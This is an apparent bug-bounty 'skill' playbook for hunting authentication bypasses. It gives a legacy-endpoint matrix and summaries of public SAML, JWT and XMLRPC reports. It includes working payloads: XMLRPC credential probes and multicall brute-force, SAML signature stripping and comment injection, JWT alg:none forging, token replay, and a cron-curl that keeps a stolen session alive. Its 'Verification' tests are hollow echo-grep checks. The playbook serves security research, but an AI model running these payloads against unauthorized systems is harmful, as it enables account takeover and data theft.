---
name: hunt-auth-bypass
description: Hunting skill for auth bypass vulnerabilities. Built from 12 public bug bounty reports across SAML XSW / parser-differential (GitHub Enterprise CVE-2025-25291/25292), SAML signature stripping (Uber, Rocket.Chat, samlify CVE-2025-47949), SAML domain enforcement bypass via control characters (HackerOne 2024), partner-portal cross-IdP assertion reuse (Slack), WordPress XMLRPC bypassing SSO (Uber), JWT alg-confusion HS256/RS256 (Jitsi), JWT signature-validation skip (Linktree, Newspack), and token-audience confusion (Argo CD CVE-2023-22482). Use when hunting auth bypass — see the Legacy-Protocol Matrix for branded-UI vs legacy-endpoint patterns. Full-surface playbook (register/2FA/OTP-alias/OAuth redirect_uri/reset/link-account) → references/auth-surface-mindmap.md.
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [auth, bypass, hunt, redteam]
---

## Crown Jewel Targets

Auth bypass is consistently one of the highest-paying vulnerability classes in bug bounty because it directly violates the most fundamental security control. High-value targets include:

- **SSO/SAML implementations** at enterprise SaaS companies (Slack, Okta, OneLogin integrations) — payouts regularly in the $5K–$25K+ range
- **Admin panels and partner/internal portals** — subdomain-separated admin surfaces like `partners.shopify.com`, `admin.company.com`
- **Third-party auth plugin integrations** — WordPress plugins (OneLogin, WP-SAML-Auth), Drupal SSO modules, any CMS with pluggable auth
- **XMLRPC endpoints** on WordPress — often forgotten, bypasses standard WP auth flows entirely
- **OAuth callback flows** — state parameter mishandling, redirect_uri mismatches
- **API authentication layers** — especially where auth was bolted on after the fact

**Asset priority:** Targets with federated identity (SAML, OAuth, OIDC) connected to large user populations. Partner/reseller portals are particularly juicy because they often have elevated permissions and less security scrutiny than the main product.

---

## Attack Surface Signals

**URL patterns to hunt:**
```
/xmlrpc.php
/wp-login.php
/saml/
/sso/
/auth/saml/callback
/oauth/callback
/partners.*
/admin.*
/?wc-api=
/api/v*/auth
/login?redirect=
/accounts/login
```

**Response headers signaling SSO:**
```
X-Frame-Options: SAMEORIGIN (common on SSO portals)
Set-Cookie: SAMLResponse=
Location: https://idp.company.com/saml
WWW-Authenticate: Bearer realm="partners"
```

**JS patterns indicating federated auth:**
```javascript
// Look for in page source
samlRequest
RelayState
SAMLResponse
onelogin
shibboleth
okta
passport.js authenticate
```

**Tech stack signals:**
- WordPress + any SSO plugin → check XMLRPC separately
- Shopify Partner API exposure → cross-tenant privilege escalation risk
- Any app advertising "SSO enabled" or "Login with [Enterprise IdP]"
- Separate subdomains for admin/partner that share session cookies with main domain
- Applications using `SimpleSAMLphp`, `ruby-saml`, `python-saml`

**Burp passive scan triggers:**
- `SAMLResponse` in any POST body
- `openid_connect` or `id_token` in responses
- Cookie domains set to `.company.com` (wildcard)

---

## Step-by-Step Hunting Methodology

1. **Map all authentication entry points**
   - spider the target for every login surface: main login, admin login, API login, partner portal, mobile API endpoints
   - check `robots.txt`, JS files, and the wayback machine for forgotten endpoints like `/xmlrpc.php`

2. **Identify the auth mechanism per entry point**
   - Is it forms-based, SAML, OAuth, API key, session token?
   - For WordPress: always probe `/xmlrpc.php` even if the main login is SSO-protected

3. **Test XMLRPC independently of SSO**
   - If site uses SSO (e.g., OneLogin), manually POST to `/xmlrpc.php`
   - XMLRPC uses WordPress-native credentials, not SSO — test with `system.listMethods` first, then `wp.getUsersBlogs`

4. **Enumerate SAML implementation**
   - Capture a valid SAMLResponse via Burp
   - Decode the Base64 payload, inspect the XML
   - Test signature stripping, comment injection, and XML wrapping attacks
   - Test if SP validates the signature at all (send unsigned assertion)

5. **Test cross-portal session/token reuse**
   - Log into `partners.shopify.com` type portals
   - Attempt to use the issued token/cookie against the main admin portal
   - Look for shared cookie domains, shared JWT secrets, or API tokens that work across contexts

6. **Fuzz auth parameters**
   - Null/empty passwords, `password[]=array`, SQL in username field
   - Try `admin`/`admin`, `test`/`test` on staging subdomains
   - Modify `role`, `is_admin`, `user_type` in JWTs (none algorithm, weak secret)

7. **Check redirect and state parameters**
   - Does removing `state` from OAuth break anything?
   - Can you change `redirect_uri` to an open redirect target?
   - Does the `RelayState` in SAML get validated?

8. **Verify impact by escalating privileges**
   - Don't stop at login — prove you can access admin functions, other users' data, or sensitive configuration
   - Screenshot the highest-privilege action you can perform

---

## Legacy-Protocol Matrix (Probe These First on Any Custom-Branded Login)

When a target has a custom, branded login UI (e.g. `customlogin.aspx`, `/auth/signin`, `/account/login`), **always probe the platform's legacy protocol endpoints with native credentials** in parallel. These endpoints frequently outlive the custom UI's protections and accept native credentials with NO rate limit, NO MFA challenge, NO CAPTCHA, NO anti-automation. This is the WordPress XMLRPC pattern generalised across CMS / portal / framework stacks.

| Target tech | Legacy endpoint(s) to probe | Native-cred bypass surface |
|---|---|---|
| **WordPress** | `/xmlrpc.php` (`system.listMethods`, `wp.getUsersBlogs`, `system.multicall`) | Native WP user/pass; bypasses SSO, MFA, IP-allow rules on `/wp-login.php` |
| **WordPress (REST)** | `/?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users` | User enumeration anonymously even when login page is hardened |
| **SharePoint (any version)** | `/_vti_bin/Authentication.asmx` (`Mode` + `Login` SOAP ops) | Native Forms-auth credential; FedAuth cookie returned; no rate limit on this endpoint observed on SP2013 farms — **this is the canonical SP equivalent of the WP XMLRPC bypass** |
| **SharePoint legacy** | `/_vti_bin/_vti_aut/author.dll`, `/_vti_bin/_vti_adm/admin.dll`, `/_vti_bin/owssvr.dll` | FrontPage RPC; sometimes still wired to credential validators |
| **SharePoint REST** | `/_api/contextinfo` (POST), `/_api/$metadata` | Anonymous FormDigest issuance; full API surface enumeration |
| **Atlassian (Jira / Confluence)** | `/rest/auth/1/session` (basic-auth), `/rest/api/2/myself`, legacy `/rest/api/1.0/` | Native credentials accepted on `/rest/auth/1/session` even when Atlassian Crowd / Atlassian Access SSO is enforced on the UI |
| **Drupal** | `/jsonapi/`, `/user/login?_format=json` | JSON POST endpoint that accepts native passwords; separate from SSO middleware |
| **Drupal (D7 legacy)** | `/?q=user/login`, `/services/`, `/rest/` | Older REST modules with independent auth |
| **Joomla** | `/administrator/index.php?option=com_login`, `/api/index.php/v1/users` | Native Joomla credentials accepted on admin entry independent of any front-site SSO |
| **Exchange / OWA** | `/EWS/Exchange.asmx`, `/Autodiscover/Autodiscover.xml`, `/Microsoft-Server-ActiveSync` | NTLM / Basic; bypasses OWA UI restrictions (MFA, IP-allow). The classic CVE-2020-0688 / CVE-2021-26855 surface |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login`, `/nf/auth/doAuthentication.do` | Native AD credentials; independent of MFA wrappers |
| **F5 BIG-IP** | `/mgmt/tm/util/bash`, `/tmui/login.jsp` | Native admin credentials |
| **Generic ASP.NET app** | `*.asmx?WSDL`, `*.svc?WSDL`, `trace.axd`, `elmah.axd`, `.disco` | Find every web service; many take credentials independently of the WebForms login |
| **Spring Boot** | `/actuator/*`, `/management/*`, `/api/v1/auth/login`, `/api/v1/swagger-ui` | Actuator endpoints sometimes anonymously enumerable |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script`, `/manage`, `/computer/(master)/script` | API tokens + native auth |
| **GitLab** | `/api/v3/*` (deprecated but still on old installs), `/api/v4/users`, `/api/v4/projects` | Personal Access Tokens with looser scoping than UI session |
| **TeamCity** | `/app/rest/users`, `/login.html?username=&password=` (GET-form-login) | Native admin credentials |
| **Apache Tomcat** | `/manager/html`, `/host-manager/html`, `/manager/text/list` | Native Tomcat realm credentials independent of any front auth |
| **WebLogic** | `/console/login/LoginForm.jsp`, `/wls-wsat/*` | Native admin |
| **Oracle EBS / PeopleSoft** | `/OA_HTML/AppsLogin`, `/psp/*/?cmd=login` | Native ERP credentials |

**How to use:**
1. Identify the tech stack from headers + paths (use `hunt-misc` Attack Surface Signals).
2. Find the row above that matches.
3. Probe the legacy endpoint anonymously to confirm it's reachable and not 403/404.
4. Test with synthetic credentials to confirm it accepts native credential format and returns differential responses (success vs failure).
5. Verify there is no rate limit, no lockout, no CAPTCHA — burst 10 requests at the same user, confirm uniform timing.
6. Report as **Critical / High** depending on chain to ATO: an anonymous + unlimited credential brute-force endpoint is consistently Critical on bug-bounty programs.

**Lesson from a authorized engagement:** A an enterprise dealer portal on SharePoint 2013 had a custom branded `customlogin.aspx`. The hunt-auth-bypass skill was loaded but the matrix above did not exist in this document — and the WordPress XMLRPC pattern was not connected to the SharePoint equivalent. `/_vti_bin/Authentication.asmx` was reachable anonymously, accepted unlimited credential attempts with no rate limit and no lockout, and was the highest-impact finding in the engagement. Walking this matrix on the first pass would have surfaced it immediately.

---

## Payload & Detection Patterns

**XMLRPC auth probe (bypasses SSO):**
```bash
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# If 200 with method list → XMLRPC is enabled, test auth:
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**SAML signature stripping (send unsigned assertion):**
```python
import base64, re

# Decode captured SAMLResponse
saml_b64 = "BASE64_FROM_BURP"
saml_xml = base64.b64decode(saml_b64).decode()

# Strip the Signature element entirely
stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)

# Re-encode and submit
print(base64.b64encode(stripped.encode()).decode())
```

**SAML XML comment injection (username confusion):**
```xml
<!-- Original NameID -->
<NameID>attacker@evil.com</NameID>

<!-- Injected to confuse parser -->
<NameID>attacker@evil.com<!---->.victim@company.com</NameID>

<!-- Or namespace confusion -->
<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
```

**Partner/cross-portal token reuse test:**
```bash
# Get token from partner portal
TOKEN=$(curl --max-time 30 --connect-timeout 10 -s -X POST https://partners.target.com/login \
  -d 'email=attacker@test.com&password=pass' \
  -c cookies.txt | grep -o 'token=[^;]*')

# Replay against admin portal
curl --max-time 30 --connect-timeout 10 -s https://admin.target.com/dashboard \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: $TOKEN"
```

**JWT none algorithm attack:**
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

**Grep patterns for auth bypass surface:**
```bash
# Find XMLRPC in scope
grep -r "xmlrpc" scope_urls.txt

# Find SSO indicators in JS
grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js

# Find partner/admin subdomains
subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
```

---

## Common Root Causes

1. **SSO bypasses local auth entirely at the UI layer, but not at the API layer** — developers disable the login form but forget that API endpoints (`/xmlrpc.php`, REST API, mobile API) have their own auth handlers that still accept native credentials.

2. **SAML signature validation is skipped or optional** — library defaults often don't enforce signature checking; developers use `wantAssertionsSigned: false` or fail to configure the IdP certificate correctly.

3. **Shared session infrastructure across different trust levels** — partner portals and admin portals reuse the same session cookie or JWT secret because they're built on the same internal framework, assuming access control at the application layer is sufficient.

4. **Trust inheritance in multi-tenant architectures** — a token issued in a lower-privilege context (partner, reseller) is accepted in a higher-privilege context because the verification only checks signature validity, not the issuance context.

5. **Plugin/module auth is independent of application auth** — every WordPress plugin that handles auth (contact forms, REST API extensions, WooCommerce) may implement its own auth handler inconsistently with the main site's SSO.

6. **XML parsing inconsistencies** — different XML parsers (used by SP vs. IdP) handle comments, namespaces, and whitespace differently, enabling confusion attacks where the signed content differs from the evaluated content.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| SSO enforced on login page | Probe alternate entry points: XMLRPC, REST API, mobile API, legacy endpoints |
| SAML signature validation | XML comment injection, namespace wrapping, signature wrapping (XSW), remove signature entirely |
| IP allowlisting on admin portal | Use partner portal token if it shares auth backend |
| Rate limiting on login | XMLRPC allows credential stuffing via `system.multicall` — batches hundreds of auth attempts in one request |
| CSRF token on login form | SAML flow is POST-based cross-origin by design; no CSRF token needed on `/saml/callback` |
| JWT signature validation | `alg: none`, key confusion (RS256 → HS256 with public key as secret), brute-force weak secrets |
| Separate session stores per portal | Check if cookie domain is `.target.com` (wildcard) — cookie bleeds between subdomains |
| MFA on primary login | If SAML SP doesn't enforce MFA at the assertion level and accepts pre-auth assertions, MFA can be skipped |

**XMLRPC multicall for mass auth bypass:**
```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <!-- repeat for each credential pair -->
  </data></array></value></param></params>
</methodCall>
```

---

## MDPsec Verified Patterns (23 real auth-bypass reports)

Real-world primitives from mdpsec.com reports:

1. **Config endpoint leaks auth policy** — public config says `LocalIDP.SelfRegister: DISALLOWED` but `POST /auth/v3/login` accepts self-registered accounts; policy enforced only in frontend (UI hides form), never backend (1). Always compare published policy vs actual endpoint behavior.
2. **Selective filter chain, not default-deny** — Spring Security filter matches some routes; controllers outside rules run unauthenticated. Signature: `curl /api/users` → 403 vs `/api/users/csv` → 400 "Required parameter missing" = filter forwarded (11). Same 200-vs-401 sibling split on healthcare (52), staging vs prod (35), explorer instances (53).
3. **Client-side session ID = auth theater** — chatbot `generateSessionId()` → `${date}-${random()}` never validated server-side; only `platform` brand id required (12).
4. **Skip-verification query flag** — endpoint variant with flag skips DOB+postcode check; supply only candidate quote number → per-quote token (57, 59). Look for alternate query params on retrieve/verify endpoints.
5. **Token minted from public bootstrap endpoint** — anonymous bearer mintable from no-auth endpoint, accepted by sensitive retrieve endpoints (56, 57, 58).
6. **Forgeable login token chain** — anonymous session-seed → login-token mint given only target identity string + brand id → exchange binds session to victim (73). No ownership check on mint.
7. **Mutable identity claim** — backend derives principal from user-editable IdP custom attribute; token carries self-service scope → overwrite own identity field to victim's code (67). SignUp with victim's `custom:aId` tenant UUID → whole victim tenant directory (127).
8. **Wildcard postMessage login code** — `opener.postMessage(loginSuccessMessage, '*')` on real login origin with `?flow=popup` → any opener window gets OAuth code → exchange → PATCH email without re-auth (92).
9. **Per-resolver GraphQL auth gap** — introspection shows 3 resolvers lack auth middleware while siblings reject; endpoint URL leaked by anonymous bootstrap config (77).
10. **Anonymous bearer + response-shape oracle** — populated array = customer, empty = non-customer, same HTTP status; phone→PII lookup (58).
11. **Body-length oracle** — valid quote returns small token envelope, invalid larger error envelope — status normalization doesn't close it (59).
12. **JSON-body SQLi bypassing query-string WAF** — front protection 403s injection on query strings but JSON POST/PUT passes; published spec declares `security: []` (60).
13. **Staging/prod asymmetry** — staging host serves production data with no auth while prod returns 401 (35); chat → dataset artifact → signed URL chain.
14. **Zero-credential profile endpoint** — progressive-profiling endpoint behind IdP with no token/cookie; two sequential writes (password then email) to change both (89).
15. **`cookie_needed:false` + `origins:["*:*"]` transport info** — data explorer renders with no session; nonce ≠ auth token (53).
16. **Reset-token oracle** — `forgot-password` mints fresh reset token, read back char-by-char via `filter[lastEditor][resetToken][startsWith]` oracle → reset-password → super-admin (21, 103).
17. **Client-side-only screening** — warranty claim eligibility = browser radio questions; single POST with correct event target bypasses; server response says `loginStatus = 'Anonymous'` (117).
18. **Zendesk-style email→token mint** — public endpoint generates signed support-system token given ONLY an email; no expiration; doubles as email enum oracle (128).
19. **Deep-link SDK OTP chain (34)** — live production deep-link attribution key in both binaries → minted link opens in-app WebView sharing localStorage with app → OTP-send to victim email with concurrent codes valid 30 min (not invalidated on new send) → victim types code into fake form → attacker captures → login from separate device; refresh tokens long-lived and replayable.
20. **Broken auth / missing access control (115)** — `GET /api/drivers/nearby?latitude=&longitude=&radius=5000` no API key/session/CAPTCHA; a fake bearer token returns identical 200 (token never validated); ~40 sibling routes return 401/403, only this route open → live GPS tracking of every driver; poll 25s apart + match stable vehicle ids → reconstruct routes.
21. **Hardcoded credential / auth bypass (69)** — Android app generates session token signed with shared secret; secret derivable from binary constants (password+salt); metering endpoint does NOT validate signature (unsigned + wrong-key tokens accepted) → forge token + device-id cookie → paywall bypass (`granted: true, grant reason: "SUBSCRIBER"`).

Cross-ref `mdpsec-report-knowledge` for the full index.

## Gate 0 Validation

Before writing any report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be: authenticate as another user OR authenticate without valid credentials OR elevate to admin/privileged role. "Partial information disclosure" is not auth bypass.

2. **What does the victim LOSE?**
   Must identify a concrete asset: account takeover of specific user, access to all admin functions, ability to read/modify other tenants' data, or access to privileged APIs. Abstract "security control bypass" without impact is not sufficient.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: (a) start from a fresh browser/session, (b) follow your exact steps, and (c) arrive at authenticated access to a protected resource. If reproduction requires special preconditions you can't re-create (a specific victim's active session, timing windows), the report needs more work.

---

## Real Impact Examples

**Scenario 1 — SSO Enforcement Bypassed via Forgotten Protocol Endpoint**
A large ride-sharing company enforced SSO (via OneLogin) on all WordPress-based internal/public properties. The XMLRPC endpoint (`/xmlrpc.php`) remained active and accepted WordPress-native credentials entirely independent of the SSO flow. An attacker with any valid WP-native credentials (obtained via credential stuffing or from a previous breach) could authenticate directly through XMLRPC, bypassing MFA, SSO policies, and IP restrictions enforced on the main login form. Impact: Full authenticated access to all WordPress functions available to that user role, including content management and potentially admin functions.

**Scenario 2 — SAML Assertion Forgery via Signature Validation Failure**
A major enterprise communication platform's SAML SP implementation failed to properly validate assertion signatures in specific edge cases. By manipulating the XML structure of a captured SAMLResponse (specifically through comment injection or namespace prefix attacks), an attacker could modify the `NameID` value to impersonate any user in an organization — including workspace administrators — without possessing that user's credentials or private key material. Impact: Complete account takeover of any user within a SAML-enabled organization; attacker gains access to all messages, files, and integrations in the workspace.

**Scenario 3 — Cross-Portal Privilege Escalation via Shared Auth Backend**
An e-commerce platform's partner/reseller portal issued authentication tokens that were validated by the same backend service as the merchant admin portal. A partner-level account (lower trust, external-facing) could use its issued credentials or tokens to authenticate directly against admin-tier API endpoints, bypassing the merchant onboarding and permission assignment flow. Impact: A malicious partner could access any merchant's admin panel, modify store configurations, exfiltrate customer PII and payment data, or install malicious scripts — affecting thousands of merchant storefronts.

---

## Disclosed Report Citations (Backfill +8 — 2016-2025)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans 4 SAML subclasses, 4 JWT subclasses, 1 legacy-protocol (XMLRPC), and 2 partner-portal cross-domain reuse patterns.

5. **GitHub Enterprise Server — SAML XSW via parser differential (CVE-2025-25291/25292)** ([H1 #2579939](https://hackerone.com/reports/2579939) · [Blog](https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/))
    - Subclass: SAML signature stripping / XSW (parser-differential variant)
    - Payload: signed SAML response; inject a sibling `<Assertion>` so REXML (signature-checker) and Nokogiri (business-logic reader) resolve different nodes via the same XPath. Signature validates against benign node; SP consumes attacker-controlled `<NameID>admin@target</NameID>`
    - Root cause: two XML parsers used for verification vs consumption return different elements for the same XPath
    - Year: 2025 — GitHub Security Lab bounty (program max class, internally rated Critical)

6. **GitHub Enterprise — SAML signature bypass on encrypted assertions (CVE-2024-4985)** ([H1 #2475347](https://hackerone.com/reports/2475347) · [ProjectDiscovery advisory](https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass))
    - Subclass: SAML signature stripping (XSW family) when encrypted-assertions feature enabled
    - Payload: forge SAML response with attacker-controlled assertion; exploit improper signature verification on the encrypted-assertion code branch; provision arbitrary user including `site_admin`
    - Root cause: improper cryptographic signature verification on the encrypted-assertion code branch
    - Year: 2024 — bounty undisclosed, CVSS 10.0

7. **Uber — SAML auth bypass on `uchat.uberinternal.com`** ([H1 #223014](https://hackerone.com/reports/223014))
    - Subclass: SAML signature stripping / improper assertion verification (OneLogin SP-side)
    - Payload: replay/modify SAML assertion with forged `NameID`; SP did not strictly validate signature scope, so attacker-controlled assertion accepted, granting OneLogin SSO session to internal chat
    - Root cause: improper SAML signature verification on SP implementation
    - Year: 2017 — **$8,500**

8. **Uber — OneLogin SSO bypass via WordPress XMLRPC** ([H1 #138869](https://hackerone.com/reports/138869))
    - Subclass: WordPress XMLRPC bypassing SSO (legacy-auth path not gated) — canonical Legacy-Protocol Matrix case
    - Payload: OneLogin plugin auto-created WP users with literal password `@@@nopass@@@`. SSO plugin blocked `wp-login.php` only. POST `xmlrpc.php` with `wp.getUsersBlogs` + known shared password → authenticated as any previously-SSO'd user
    - Root cause: SSO enforcement applied at one auth surface (wp-login) but legacy XML-RPC path retained password auth with a guessable shared password
    - Year: 2016 — **$7,000**

9. **Slack — SAML "confused-deputy" assertion reuse** ([Writeup](http://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html))
    - Subclass: partner-portal / cross-IdP assertion reuse (audience-restriction not validated)
    - Payload: take an old expired GitHub-signed SAML assertion (different audience, different subject) → present to Slack ACS → Slack logs attacker in as the asserted username
    - Root cause: no audience-restriction nor freshness check; trust extended across IdPs
    - Year: 2017 — **$3,000**

10. **HackerOne — SAML signup domain enforcement bypass via control characters** ([H1 #2101076](https://hackerone.com/reports/2101076))
    - Subclass: partner-portal / SAML domain-binding bypass via unicode control characters
    - Payload: new user sign-up at SAML-enforced org; append trailing control character (e.g., `\r`, ` `) to email → domain comparison normalises away, signup proceeds → unauthorised access to the org
    - Root cause: inconsistent unicode/control-char normalisation between domain check and identity write
    - Year: 2024 — bounty awarded (amount undisclosed)

11. **8x8 / Jitsi-Meet — JWT alg-confusion (asymmetric verifier accepts symmetric alg)** ([H1 #1210502](https://hackerone.com/reports/1210502))
    - Subclass: JWT alg-confusion (RS256 → HS256 using public key as HMAC secret)
    - Payload: server publishes RS256 verification public key. Send a token with header `{"alg":"HS256"}` signed with that public key as the HMAC secret → Prosody module validates and admits attacker into authenticated/moderator room
    - Root cause: verifier did not enforce `alg=RS256`; allowed symmetric algorithm using the public key as shared secret
    - Year: 2021 — bounty undisclosed

12. **Argo CD (Internet Bug Bounty) — JWT audience claim not validated (CVE-2023-22482)** ([H1 #1889161](https://hackerone.com/reports/1889161))
    - Subclass: token-scope / audience check at issuance not at use (cross-audience token confusion)
    - Payload: obtain any RS256-signed token signed by the cluster's OIDC issuer but minted for a different `aud` (e.g., `kubernetes`) → present it as bearer to Argo CD API → API treats it as valid because it accepted the issuer's signature and skipped `aud` enforcement
    - Root cause: `aud` claim not enforced; signature-trust extended across audiences
    - Year: 2023 — **$2,400** via IBB

---

## Duende BFF — Token-Confusion & Session-Fixation (2024-2026 surface)

Duende BFF deployments expose two distinct auth-bypass families beyond the CSRF angle covered in `hunt-csrf`. Both are documented architectural realities, not unicorn CVEs.

### Attack class 1 — YARP `UserOrClient` / `UserOrNone` privilege escalation

`Duende.BFF.Yarp` attaches access tokens to proxied routes via `WithAccessToken(TokenType.X)` metadata. The **misconfig pattern**: developer marks a route `UserOrClient` (use user token if logged in, else fall back to *client-credentials* token) intending it for a "public catalog" endpoint. The client-credentials (M2M) token frequently has broader scope (`api.admin`, `internal.read`) than any user token. An **unauthenticated** attacker hitting that route gets the request proxied with the **service-account token attached** to the downstream API — privilege escalation by design when the downstream trusts the bearer.

**Payload shape:** identify a BFF route marked `TokenType.UserOrClient` (visible via 401-vs-200 differential when no session, or via leaked OpenAPI/NSwag spec). Hit it with no cookies → BFF forwards with M2M token granting admin-scope downstream. ([docs.duendesoftware.com/bff/fundamentals/apis/yarp](https://docs.duendesoftware.com/bff/fundamentals/apis/yarp/))

**Adjacent confirmed CVE:** **CVE-2024-51987** in `Duende.AccessTokenManagement.OpenIdConnect` — *"HTTP client uses incorrect token after refresh"* — materially the same family of token-confusion at the proxy layer. Moderate severity, fixed 2024. ([GHSA-...51987](https://github.com/advisories?query=duende))

### Attack class 2 — Cookie-domain wildcard + sliding expiration = persistent ATO

When BFF session cookie has `Domain=.example.com` (devs do this to share login across `app.` and `admin.`), the `__Host-` prefix protection is dropped. Any sibling subdomain — including a **taken-over** one (`legacy.example.com` CNAMEd to deprovisioned Heroku/S3) — can write `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com`. Victim hits `app.example.com` carrying the attacker's session = **session-fixation ATO**.

If `SlidingExpiration=true` (default) and `ExpireTimeSpan` is large (e.g. 8h), an exfiltrated cookie remains valid and keeps sliding forward as long as the attacker periodically calls `/bff/user`. There is no server-side refresh-token rotation check on the cookie itself — only the OIDC token (server-side) rotates. Persistent ATO window per stolen cookie.

**Payload shape:** subdomain takeover → write the BFF session cookie with `Domain=.example.com` → victim's next visit to `app.example.com` adopts attacker's session. Cron-curl `GET /bff/user -H 'X-CSRF: 1' -b '.AspNetCore.Cookies=...'` every 6h indefinitely to keep the session alive.

**Hardening reference:** [docs.duendesoftware.com/bff/fundamentals/session/handlers](https://docs.duendesoftware.com/bff/fundamentals/session/handlers/), [nestenius.se BFF cookie guide](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/), [Langkemper on `__Host-` prefix](https://www.sjoerdlangkemper.nl/2017/02/09/cookie-prefixes/).

### Attack class 3 — `/bff/user` claim disclosure

`GET /bff/user` returns the **full claim set** of the active session as a JSON array — `sub`, `sid`, `email`, `bff:session_expires_in`, `bff:session_state`, `bff:logout_url`, plus every custom claim the OP issued (department, role, internal employee ID, tenant ID). The endpoint is gated only by session cookie + `X-CSRF: 1`. If `AnonymousSessionResponse=Response200` is set, the endpoint also acts as a session probe (200 + claims vs 200 + `null`) usable as an auth-state oracle. Low/Medium info-disclosure on its own; valuable as recon for the YARP token-confusion class above. ([docs.duendesoftware.com/bff/fundamentals/session/management/user](https://docs.duendesoftware.com/bff/fundamentals/session/management/user/))

### Evidence strength + reporting tip

No Duende.BFF-direct CVE exists. The three classes are exploitable via real-world misconfigurations; CVE-2024-51987 and CVE-2025-26620 in the adjacent `Duende.AccessTokenManagement` packages make token-confusion a confirmed family. **Report by chain impact** (e.g., "low-priv session reaches admin-scope downstream API via UserOrClient route" → Critical) rather than by CVE citation, since the issue is design-level.

Cross-references for the chain:
- `hunt-csrf` — the role-partitioned antiforgery class (the CSRF angle on the same BFF surface).
- `hunt-subdomain-takeover` / `hunt-subdomain` — required primitive for the cookie-domain attack.

---

## Function-Level Access Control (Broken Authorization)

Authentication bypass gets you *in*; **function-level access control** failures let an already-authenticated low-privilege user reach privileged *functions* the UI never offered them. This is the authorization sibling of `hunt-idor` (object-level access) — test both whenever you hold any authenticated session.

**The sibling-function rule:** if 9 endpoints under a path enforce auth/role middleware, the 10th that doesn't is your bug. Admin route families are the highest-yield place to look:

```
/api/admin/users   → has auth middleware
/api/admin/export  → often MISSING it
/api/admin/delete  → often MISSING it
/api/admin/reset   → often MISSING it
```

**Anti-patterns to grep for:**
```javascript
// Missing middleware on a sibling route
router.get('/admin/users',  authenticate, authorize('admin'), getUsers);
router.get('/admin/export', getExport);            // No middleware!

// Client-side role check only — server never re-checks
if (user.role === 'admin') showAdminButton();      // frontend gate
app.post('/api/admin/delete', deleteUser);         // no server-side check
```

**How to hunt:** enumerate every privileged endpoint (admin/export/delete/reset/impersonate, GraphQL admin queries), then replay each from a *regular* authenticated session — and again with no session. A 200 (or a differential vs the 403 its siblings return) is broken function-level access control.

**Real paid example — HackerOne TrustHub:** `POST /graphql` with the `TrustHubQuery` operation had no authorization check — a regular user could read all vendors' data (CVSS 8.7, High). The object-level variant (e.g. a WebSocket `get_history` accepting an arbitrary UUID with no ownership check) belongs to `hunt-idor`.

---

## Verification

Run this self-test to confirm auth bypass hunting readiness:

1. **JWT alg:none test** — verify token generation:
   ```bash
   python3 -c "
   import base64,json
   h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
   p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
   print(f'{h}.{p}.')
   " && echo "PASS: alg=none token generated" || echo "FAIL"
   ```

2. **X-Forwarded-For bypass syntax** — confirm header injection:
   ```bash
   echo "X-Forwarded-For: 127.0.0.1" | grep -q "127.0.0.1" && echo "PASS: bypass header syntax" || echo "FAIL"
   ```

3. **Direct URL bypass test** — confirm post-login path probing:
   ```bash
   echo "/dashboard /admin /settings /account" | grep -q "dashboard" && echo "PASS: post-login path list present" || echo "FAIL"
   ```

All 3 tests verify auth bypass probing capability.

---

## Pitfalls

- **Confusing "no auth" with "auth bypass"** — an endpoint that requires no authentication is a design choice, not a bypass. A bypass requires an auth check that can be evaded.
- **IP whitelist bypass via headers only** — `X-Forwarded-For: 127.0.0.1` may change the response status but doesn't prove access. Verify the response body contains privileged data.
- **JWT alg:none without server acceptance** — many servers reject alg:none by default. Test on the actual production endpoint with a forged token.
- **401 on direct access but 200 via proxy path** — some apps have `/internal/` paths that bypass auth when accessed via specific routes. Map the full routing tree.
- **Header-based auth that conflicts with cookie auth** — if both `Authorization: Bearer` and session cookie are sent, one may override the other. Test each independently.
- **Step-up auth bypass** — bypassing 2FA/MFA after initial login is the most common auth-bypass pattern. Test direct navigation to post-login URLs.


---

## Related Skills & Chains

- **`hunt-idor`** — Auth bypass without object-level access is half a finding; pair them. Chain primitive: legacy `/v1/users/{id}` route missing both auth middleware AND ownership check = unauthenticated cross-tenant data read via direct ID substitution → full PII dump from "I am nobody" starting position.
